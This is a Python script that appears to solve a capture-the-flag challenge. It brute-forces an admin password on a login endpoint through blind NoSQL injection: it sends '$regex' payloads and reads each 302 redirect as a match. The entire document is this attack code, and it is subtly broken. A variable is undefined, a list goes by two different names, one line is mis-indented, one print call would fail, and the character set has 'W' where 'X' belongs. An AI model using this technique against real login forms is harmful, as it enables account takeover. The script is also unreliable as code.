import requests


if __name__ == '__main__':
    strings = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWSYZ{}_'
    target = 'https://nosequels.2019.chall.actf.co/login'
    headers = {'Content-Type': 'application/json'}
    cookies = {'token': your_token}
    valid_strings = []

    # 使用文字探索
    for char in strings:
        payload = {"username": "admin", "password": {"$regex": "^.*" + char + ".*$"}}
        print('attempting:' + char)
        res = requests.post(target, json=payload, headers=headers, cookies=cookies, allow_redirects=False)
        if res.status_code == 302:
            valid_strings.append(char)


    print('valid_strings is', pass_strings)

    # 長さの探索
    length = 0
    while True:
        length += 1
        payload = {"username": "admin", "password": {"$regex": "^.{" + str(length) + "}$"}}
        print('attempting:', + length)
        res = requests.post(target, json=payload, headers=headers, cookies=cookies, allow_redirects=False)
        if res.status_code == 302:
            break

     print('string_length is', length)

    # パスワードの探索
    password = ''
    for i in range(length):
        for char in pass_strings:
            payload = {"username": "admin", "password": {"$regex": "^" + password + char + ".*$"}}
            res = requests.post(target, json=payload, headers=headers, cookies=cookies, allow_redirects=False)
            if res.status_code == 302:
                password += char
                print('current_password is', password)
                break
